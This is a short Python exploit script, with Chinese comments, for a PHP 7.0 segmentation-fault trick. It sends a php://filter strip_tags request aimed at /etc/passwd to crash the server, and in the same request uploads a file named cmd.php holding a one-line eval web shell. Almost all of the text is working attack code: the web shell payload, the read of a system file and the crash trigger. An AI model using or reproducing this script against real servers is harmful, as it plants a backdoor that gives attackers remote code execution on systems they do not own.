#php7.0的segment fault利用
import requests

url='url?var=php://filter/string.strip_tags/resource=/etc/passwd'     #使程序崩溃
file = {'file':('cmd.php','<?php @eval($_POST['cmd'])?>')}
res = requests.post(url=url, files=file)
print(res.text)      #估计是无响应
